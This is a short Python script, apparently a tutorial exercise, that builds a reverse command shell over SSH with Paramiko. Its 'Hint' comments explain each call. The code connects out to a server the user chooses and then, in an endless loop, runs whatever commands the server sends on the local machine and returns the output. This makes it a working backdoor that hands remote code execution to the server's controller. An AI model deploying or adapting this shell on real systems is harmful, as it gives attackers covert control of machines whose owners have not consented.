import paramiko
import shlex
import subprocess


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    # Hint: get_transport() is the "Engine Room."
    # It allows us to open a specialized session for sending and receiving raw data.
    session = client.get_transport().open_session()

    if session.active:
        # Hint: send() is the "Outgoing Signal."
        # We send the initial command to let the server know we are ready.
        session.send(command)

        # Hint: recv(1024) is the "Incoming Ear."
        # It waits for data to come back from the remote server in 1KB chunks.
        print(session.recv(1024).decode())

        while True:
            command = session.recv(1024)
            try:
                cmd_output = subprocess.check_output(shlex.split(command.decode()), stderr=subprocess.STDOUT)
                session.send(cmd_output or 'OK')
            except Exception as e:
                session.send(str(e))
        client.close()
    return


if __name__ == '__main__':
    import getpass

    user = input('Username: ')
    password = getpass.getpass()
    ip = input('Enter server IP: ')
    port = input('Enter port: ') or 22
    ssh_command(ip, port, user, password, 'ClientConnected')
